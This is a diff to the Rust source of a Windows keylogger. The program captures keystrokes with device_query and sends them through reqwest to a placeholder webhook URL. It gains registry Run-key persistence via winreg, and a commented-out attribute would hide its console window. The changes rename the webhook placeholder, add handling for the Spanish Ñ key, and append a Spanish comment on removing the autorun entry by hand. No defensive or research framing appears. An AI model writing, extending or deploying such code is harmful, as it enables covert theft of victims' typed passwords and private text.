@@ -1,5 +1,5 @@
 //#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
-use device_query::{DeviceQuery, DeviceState, Keycode};
+use device_query::{DeviceQuery, DeviceState, Keycode}; 
 use chrono::Local;
 use std::{thread, time};
 use reqwest::blocking::Client;
@@ -7,8 +7,7 @@ use serde_json::json;
 use winreg::{RegKey, enums::*};
 use std::time::Duration;
 //ur webhuk
-const WEBHOOK_URL: &str = "tuwebhook";
-
+const WEBHOOK_URL: &str = "webhook_url";
 
 fn main() {
     let device_state = DeviceState::new();
@@ -44,7 +43,13 @@ fn main() {
                             let _ = remove_persistence();
                             return;
                         }
-                        Keycode::Semicolon => key_buffer.push("ñ".to_string()),
+                        Keycode::Grave => {
+                            if keys.contains(&Keycode::LShift) {
+                                key_buffer.push("Ñ".to_string());
+                            } else {
+                                key_buffer.push("ñ".to_string());
+                            }
+                        }
                         _ => {
                             let key_name = format!("{:?}", key);
                             if key_name.len() == 1 {
@@ -155,3 +160,7 @@ fn remove_persistence() -> Result<(), Box<dyn std::error::Error>> {
     
     Ok(())
 }
+
+
+//si eliminar persistencia no funciona ve a esta carpeta del editor de registro y borra la entrada manualmente
+//HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
